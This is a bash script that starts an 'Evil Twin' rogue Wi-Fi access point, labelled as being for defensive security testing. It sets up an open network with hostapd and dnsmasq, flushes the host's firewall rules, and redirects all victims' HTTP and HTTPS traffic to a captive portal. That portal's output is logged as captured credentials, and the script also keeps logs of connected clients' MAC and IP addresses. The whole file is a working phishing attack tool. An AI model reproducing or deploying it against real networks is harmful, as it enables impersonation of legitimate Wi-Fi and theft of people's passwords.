#!/bin/bash

#########################################################
# Evil Twin AP Start Script
# Purpose: Start an access point for defensive security testing
# Usage: sudo ./start_evil_twin.sh
#########################################################

set -e  # Exit on error

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOSTAPD_CONF="${SCRIPT_DIR}/hostapd.conf"
DNSMASQ_CONF="${SCRIPT_DIR}/dnsmasq.conf"

# Read interface from hostapd.conf
WLAN_INTERFACE=$(grep "^interface=" "$HOSTAPD_CONF" | cut -d'=' -f2)
if [ -z "$WLAN_INTERFACE" ]; then
    echo "ERROR: Could not read interface from hostapd.conf"
    exit 1
fi

ETH_INTERFACE="wlp5s0"
AP_IP="192.168.99.1"
AP_SUBNET="192.168.99.0/24"
PID_FILE="${SCRIPT_DIR}/.evil_twin.pid"
LOG_DIR="${SCRIPT_DIR}/logs"
MONITOR_INTERVAL=5  # Seconds between connection monitoring

#########################################################
# Function: Print messages with colors
#########################################################
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_banner() {
    echo -e "${GREEN}"
    echo "=========================================="
    echo "   Evil Twin AP - Start Script"
    echo "=========================================="
    echo -e "${NC}"
}

#########################################################
# Function: Check if running as root
#########################################################
check_root() {
    print_info "Checking privileges..."
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root"
        exit 1
    fi
    print_success "Running with root privileges"
}

#########################################################
# Function: Check required tools
#########################################################
check_dependencies() {
    print_info "Checking dependencies..."
    local missing_deps=()

    for cmd in hostapd dnsmasq ip iptables; do
        if ! command -v "$cmd" &> /dev/null; then
            missing_deps+=("$cmd")
        fi
    done

    if [ ${#missing_deps[@]} -ne 0 ]; then
        print_error "Missing dependencies: ${missing_deps[*]}"
        echo ""
        print_info "Please install dependencies using:"
        echo -e "  ${GREEN}sudo ${SCRIPT_DIR}/install_dependencies.sh${NC}"
        echo ""
        print_info "Or manually install with:"
        echo "  apt-get install hostapd dnsmasq iptables iproute2 wireless-tools"
        exit 1
    fi
    print_success "All dependencies found"
}

#########################################################
# Function: Discover internet interface
#########################################################
discover_internet_interface() {
    print_info "Discovering internet interface..."

    # Try to find active ethernet interface with internet
    local inet_iface=$(ip route | grep default | awk '{print $5}' | head -n 1)

    if [ -n "$inet_iface" ]; then
        ETH_INTERFACE="$inet_iface"
        print_success "Internet interface detected: ${ETH_INTERFACE}"
    else
        print_warning "Could not auto-detect internet interface, using default: ${ETH_INTERFACE}"
    fi
}

#########################################################
# Function: Check if interface exists
#########################################################
check_interface() {
    local iface=$1
    print_info "Checking interface ${iface}..."

    if ! ip link show "$iface" &> /dev/null; then
        print_error "Interface ${iface} not found"
        print_info "Available interfaces:"
        ip link show | grep -E "^[0-9]+:" | awk -F': ' '{print "  - " $2}'
        exit 1
    fi
    print_success "Interface ${iface} found"
}

#########################################################
# Function: Setup log directory
#########################################################
setup_logging() {
    print_info "Setting up logging..."
    mkdir -p "$LOG_DIR"
    touch "${LOG_DIR}/dnsmasq.log"
    touch "${LOG_DIR}/hostapd.log"
    touch "${LOG_DIR}/connections.log"
    print_success "Log directory created at ${LOG_DIR}"
}

#########################################################
# Function: Stop conflicting services
#########################################################
stop_conflicting_services() {
    print_info "Stopping conflicting services..."

    # systemctl stop NetworkManager 2>/dev/null || print_warning "NetworkManager not running"
    # systemctl stop wpa_supplicant 2>/dev/null || print_warning "wpa_supplicant not running"

    # Tell NetworkManager to stop managing this specific interface
    if command -v nmcli &> /dev/null; then
        print_info "Setting ${WLAN_INTERFACE} adding to unmanaged devices in NetworkManager..."
        nmcli device set "$WLAN_INTERFACE" managed no || print_warning "Could not set interface to unmanaged"
    fi

    # Kill any existing instances
    pkill -9 hostapd 2>/dev/null || true
    pkill -9 dnsmasq 2>/dev/null || true

    print_success "Conflicting services stopped"
}

#########################################################
# Function: Configure wireless interface
#########################################################
configure_wireless() {
    print_info "Configuring wireless interface ${WLAN_INTERFACE}..."

    # Bring interface down
    ip link set "$WLAN_INTERFACE" down
    sleep 1

    # Set interface up
    ip link set "$WLAN_INTERFACE" up
    sleep 1

    # Assign IP address
    ip addr flush dev "$WLAN_INTERFACE"
    ip addr add "${AP_IP}/24" dev "$WLAN_INTERFACE"

    print_success "Wireless interface configured with IP: ${AP_IP}"
}

#########################################################
# Function: Enable IP forwarding
#########################################################
enable_ip_forwarding() {
    print_info "Enabling IP forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    print_success "IP forwarding enabled"
}

#########################################################
# Function: Configure NAT/iptables
#########################################################
configure_nat() {
    print_info "Configuring NAT and iptables rules..."

    # Flush existing rules
    iptables -F
    iptables -t nat -F
    iptables -X

    # Set default policies
    iptables -P FORWARD ACCEPT
    iptables -P INPUT ACCEPT
    iptables -P OUTPUT ACCEPT

    # Enable NAT
    iptables -t nat -A POSTROUTING -o "$ETH_INTERFACE" -j MASQUERADE

    # Forward traffic from wlan to eth
    iptables -A FORWARD -i "$WLAN_INTERFACE" -o "$ETH_INTERFACE" -j ACCEPT
    iptables -A FORWARD -i "$ETH_INTERFACE" -o "$WLAN_INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

    # Redirect all HTTP traffic to captive portal on port 8080
    iptables -t nat -A PREROUTING -i "$WLAN_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination ${AP_IP}:8080
    iptables -t nat -A PREROUTING -i "$WLAN_INTERFACE" -p tcp --dport 443 -j DNAT --to-destination ${AP_IP}:8080

    print_success "NAT configured (${WLAN_INTERFACE} -> ${ETH_INTERFACE})"
    print_success "Captive portal redirect enabled (HTTP/HTTPS -> ${AP_IP}:8080)"
}

#########################################################
# Function: Start dnsmasq
#########################################################
start_dnsmasq() {
    print_info "Starting dnsmasq..."

    # Update log path in config
    sed -i "s|^log-facility=.*|log-facility=${LOG_DIR}/dnsmasq.log|g" "$DNSMASQ_CONF"

    dnsmasq -C "$DNSMASQ_CONF" --log-facility="${LOG_DIR}/dnsmasq.log"

    if pgrep -x dnsmasq > /dev/null; then
        print_success "dnsmasq started successfully"
    else
        print_error "Failed to start dnsmasq"
        exit 1
    fi
}

#########################################################
# Function: Start hostapd
#########################################################
start_hostapd() {
    print_info "Starting hostapd..."

    hostapd -B "$HOSTAPD_CONF" > "${LOG_DIR}/hostapd.log" 2>&1

    sleep 2

    if pgrep -x hostapd > /dev/null; then
        print_success "hostapd started successfully"
    else
        print_error "Failed to start hostapd"
        print_info "Check logs at: ${LOG_DIR}/hostapd.log"
        exit 1
    fi
}

#########################################################
# Function: Start captive portal server
#########################################################
start_portal() {
    print_info "Starting captive portal server..."

    PORTAL_DIR="${SCRIPT_DIR}/portal"

    if [ ! -f "${PORTAL_DIR}/server.py" ]; then
        print_error "Portal server not found at ${PORTAL_DIR}/server.py"
        exit 1
    fi

    # Kill any existing portal server
    pkill -f "python3.*server.py" 2>/dev/null || true
    sleep 1

    # Start portal server in background
    python3 "${PORTAL_DIR}/server.py" > "${LOG_DIR}/portal.log" 2>&1 &
    PORTAL_PID=$!
    sleep 1

    if kill -0 "$PORTAL_PID" 2>/dev/null; then
        print_success "Captive portal started (PID: ${PORTAL_PID})"
        print_info "Credentials will be saved to: ${LOG_DIR}/captured_creds.log"
    else
        print_error "Failed to start captive portal"
        print_info "Check logs at: ${LOG_DIR}/portal.log"
        exit 1
    fi
}

#########################################################
# Function: Save PIDs
#########################################################
save_pids() {
    print_info "Saving process information..."

    cat > "$PID_FILE" <<EOF
HOSTAPD_PID=$(pgrep -x hostapd)
DNSMASQ_PID=$(pgrep -x dnsmasq)
PORTAL_PID=$(pgrep -f 'python3.*server.py')
WLAN_INTERFACE=$WLAN_INTERFACE
ETH_INTERFACE=$ETH_INTERFACE
EOF

    print_success "Process information saved"
}

#########################################################
# Function: Display connected clients
#########################################################
show_connected_clients() {
    echo ""
    echo -e "${GREEN}=========================================="
    echo "   Connected Clients"
    echo -e "==========================================${NC}"

    if [ -f "${LOG_DIR}/dnsmasq.log" ]; then
        echo -e "${BLUE}DHCP Leases:${NC}"
        grep "DHCPACK" "${LOG_DIR}/dnsmasq.log" | tail -n 10 | awk '{print "  " $0}' || echo "  No clients connected yet"
    fi

    echo ""
    echo -e "${BLUE}Connected WiFi clients (via hostapd/iw):${NC}"
    # Try hostapd_cli first
    if [ -f "/var/run/hostapd/${WLAN_INTERFACE}" ]; then
        hostapd_cli -p /var/run/hostapd -i "$WLAN_INTERFACE" all_sta 2>/dev/null | grep -E "^([0-9a-f]{2}:){5}[0-9a-f]{2}$" | awk '{print "  " $1}' || echo "  No clients connected yet"
    else
        # Fallback: use iw station dump
        iw dev "$WLAN_INTERFACE" station dump 2>/dev/null | grep "^Station" | awk '{print "  " $2}' || echo "  No clients connected yet"
    fi

    echo ""
    echo -e "${BLUE}Recent DHCP assignments:${NC}"
    grep "DHCPACK(${WLAN_INTERFACE})" "${LOG_DIR}/dnsmasq.log" 2>/dev/null | tail -3 | awk '{print "  " $3 " " $4 " " $5 " " $8}' || echo "  No DHCP assignments yet"
}

#########################################################
# Function: Monitor connections in background
#########################################################
monitor_connections() {
    print_info "Starting connection monitor..."

    (
        while true; do
            sleep "$MONITOR_INTERVAL"

            {
                echo "=== $(date) ==="
                echo "Connected clients (hostapd):"
                # Get clients from hostapd (most accurate)
                if [ -f "/var/run/hostapd/${WLAN_INTERFACE}" ]; then
                    hostapd_cli -p /var/run/hostapd -i "$WLAN_INTERFACE" all_sta 2>/dev/null | grep -E "^([0-9a-f]{2}:){5}[0-9a-f]{2}$" || echo "  No clients connected"
                else
                    # Fallback: use iw to get station info
                    iw dev "$WLAN_INTERFACE" station dump 2>/dev/null | grep "^Station" | awk '{print "  " $2}' || echo "  No clients connected"
                fi

                echo ""
                echo "ARP table entries:"
                ip neigh show dev "$WLAN_INTERFACE" | grep -v "FAILED" || echo "  No ARP entries"

                echo ""
                echo "DHCP leases:"
                grep "DHCPACK(${WLAN_INTERFACE})" "${LOG_DIR}/dnsmasq.log" 2>/dev/null | tail -5 | awk '{print "  " $3 " " $4 " " $5}' || echo "  No DHCP leases"
                echo ""
            } >> "${LOG_DIR}/connections.log"

        done
    ) &

    MONITOR_PID=$!
    echo "MONITOR_PID=$MONITOR_PID" >> "$PID_FILE"

    print_success "Connection monitor started (PID: ${MONITOR_PID})"
}

#########################################################
# Function: Display summary
#########################################################
display_summary() {
    echo ""
    echo -e "${GREEN}=========================================="
    echo "   Evil Twin AP Started Successfully!"
    echo -e "==========================================${NC}"
    echo ""
    echo -e "${BLUE}Configuration:${NC}"
    echo "  SSID: $(grep "^ssid=" "$HOSTAPD_CONF" | cut -d'=' -f2)"
    echo "  Channel: $(grep "^channel=" "$HOSTAPD_CONF" | cut -d'=' -f2)"
    echo "  Security: Open (no password)"
    echo "  AP IP: ${AP_IP}"
    echo "  Subnet: ${AP_SUBNET}"
    echo "  WLAN Interface: ${WLAN_INTERFACE}"
    echo "  Internet Interface: ${ETH_INTERFACE}"
    echo ""
    echo -e "${BLUE}Logs:${NC}"
    echo "  Hostapd: ${LOG_DIR}/hostapd.log"
    echo "  Dnsmasq: ${LOG_DIR}/dnsmasq.log"
    echo "  Connections: ${LOG_DIR}/connections.log"
    echo ""
    echo -e "${YELLOW}To stop the Evil Twin AP, run:${NC}"
    echo "  sudo ${SCRIPT_DIR}/stop_evil_twin.sh"
    echo ""
    echo -e "${YELLOW}To monitor connections in real-time:${NC}"
    echo "  tail -f ${LOG_DIR}/connections.log"
    echo "  tail -f ${LOG_DIR}/dnsmasq.log"
    echo ""
    echo -e "${YELLOW}To capture traffic for analysis:${NC}"
    echo "  sudo ${SCRIPT_DIR}/capture_traffic.sh"
    echo "  sudo ${SCRIPT_DIR}/capture_traffic.sh -v  # verbose mode"
    echo ""
}

#########################################################
# Main execution
#########################################################
main() {
    print_banner

    check_root
    check_dependencies
    discover_internet_interface
    check_interface "$WLAN_INTERFACE"
    check_interface "$ETH_INTERFACE"
    setup_logging
    stop_conflicting_services
    configure_wireless
    enable_ip_forwarding
    configure_nat
    start_dnsmasq
    start_hostapd
    start_portal
    save_pids
    monitor_connections

    sleep 2
    show_connected_clients
    display_summary
}

# Run main function
main
